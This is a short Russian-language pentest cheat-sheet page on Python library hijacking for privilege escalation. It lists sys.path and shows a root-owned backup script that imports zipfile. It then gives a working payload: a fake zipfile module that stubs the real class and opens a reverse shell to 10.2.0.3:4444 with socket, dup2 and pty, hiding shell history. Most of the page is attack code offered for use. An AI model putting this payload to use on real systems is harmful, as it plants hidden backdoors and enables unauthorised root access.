# Hijacking Pyrhon

Вывод директорий в порядке приоритета подключения библиотек

```
python -c 'import sys; print "\n".join(sys.path)'
```

Если есть возможность подменить файл библиотеки, то стоит подменить в любой из доступных.

Альтернативный способ заключается в создании  py-файла с именем библиотеки и полезной нагрузкой. Пример скрипта предоставляющего лазейку

```
$ whoami
www-data

$ ls -la .
total 16
drwxr-xr-x  3 www-data www-data 4096 Sep 11 23:44 .
drwxr-xr-x 15 root     root     4096 Sep 11 23:40 ..
-rw-r--r--  1 root     root      353 Sep 11 23:44 backup.py
drwxr-xr-x  2 www-data www-data 4096 Sep 11 23:42 html

$ cat backup.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

Пример полезной нагрзуки

```
// Some code
import os
import pty
import socket

lhost = "10.2.0.3"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
    def close(*args):
        return

    def write(*args):
        return

    def __init__(self, *args):
        return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()

```

